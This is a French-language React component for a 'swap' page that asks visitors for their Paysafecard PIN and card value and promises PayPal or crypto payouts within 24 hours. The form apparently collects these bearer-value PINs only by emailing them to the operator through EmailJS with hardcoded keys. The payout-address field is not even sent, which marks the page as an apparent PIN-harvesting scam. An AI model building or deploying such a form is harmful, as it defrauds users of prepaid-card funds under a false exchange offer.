import React, { useState, useEffect, useRef } from "react";
import styled from "styled-components";
import Button from "./Button";
import Input from "./Input";
import Select from "./Select";
import emailjs from "@emailjs/browser";

function Swapper() {
  const sendOptions = ["Paysafecard"];
  const recieveOptions = ["Paypal", "Bitcoin", "Ethereum"];

  const [pscPin, setPscPin] = useState("");
  const [pscValue, setPscValue] = useState("");
  const [recieve, setRecieve] = useState("Paypal");
  const [errors, setErrors] = useState({
    pscPin: false,
  });
  const [sended, setSended] = useState(false);

  const handleSelectRecieve = (event) => {
    setRecieve(event.target.value);
  };

  const handlePscPin = (event) => {
    setPscPin(event.target.value);
  };

  const handlePscValue = (event) => {
    setPscValue(event.target.value);
  };

  const form = useRef();

  const swapFunction = (e) => {
    e.preventDefault();
    if (pscPin.length < 16 || pscPin.length > 19) {
      setErrors({
        pscPin: true,
      });
    } else {
      setErrors({
        pscPin: false,
      });
      const sendEmail = () => {
        console.log(form.current);
        emailjs.sendForm("service_krfnn9p", "template_id6amzm", form.current, "drPMiCTWFlhC9s2uH").then(
          (result) => {
            setSended(true);
          },
          (error) => {
            console.log("error");
          },
        );
      };
      sendEmail();
    }
    console.log(pscPin);
  };

  return (
    <Container>
      <Title id="swap">Sélectionnez votre Swap 🤑 !</Title>
      <Card ref={form} onSubmit={swapFunction}>
        <CardTitle>Swap</CardTitle>
        <Select options={sendOptions} placeholder="Sélectionnez votre mode d'envoie" label="J’envoie" />
        <Select
          onChange={handleSelectRecieve}
          value={recieve}
          options={recieveOptions}
          placeholder="Sélectionnez votre mode de réception"
          label="Je reçois"
        />
        <Input
          onChange={handlePscPin}
          value={pscPin}
          type="text"
          mandatory="true"
          minlength="19"
          maxlength="19"
          name="pin"
          id="pin"
          placeholder="ex: 123400005678000"
          label="Code PIN Paysafecard"
          className={errors.pscPin ? "error" : ""}
        />
        <Input
          onChange={handlePscValue}
          type="number"
          name="value"
          id="value"
          mandatory="true"
          maxlength="3"
          placeholder="ex: 10"
          label="Valeur de la carte"
        />
        <Input mandatory="true" type="text" placeholder="" label={"Adresse " + recieve} />
        <Assurance>
          Vous recevrez <span>{pscValue * 0.9}€</span> sous 24h
        </Assurance>
        <Validation className={sended ? "" : "hide"}>Votre swap a bien été enrégistré !</Validation>
        <Button content="Swapper !" />
      </Card>
    </Container>
  );
}

export default Swapper;

const Container = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
`;

const Title = styled.h2`
  font-size: 36px;
  line-height: 64px;
  font-weight: bold;
  padding-top: 5rem;
  margin-top: 0;
  @media (max-width: 768px) {
    font-size: 24px;
    line-height: 36px;
  }
`;

const Card = styled.form`
  padding: 2rem 1.5rem;
  box-sizing: border-box;
  display: flex;
  flex-direction: column;
  gap: 24px;
  background: #ffffff;
  border: 1px solid #6d24ff;
  box-shadow: 0px 8px 0px #6d24ff, 0px 48px 32px rgba(168, 168, 168, 0.12);
  border-radius: 24px;
  width: 400px;
  @media (max-width: 448px) {
    width: 100%;
  }
`;

const CardTitle = styled.h3`
  margin: 0;
  font-size: 18px;
  font-weight: bold;
`;

const Validation = styled.p`
  color: #63d769;
  font-weight: bold;
  text-align: center;
  margin: 0;
  &.hide {
    display: none;
  }
`;

const Assurance = styled.p`
  text-align: center;
  margin: 0;
  span {
    color: #63d769;
    font-weight: bold;
  }
`;
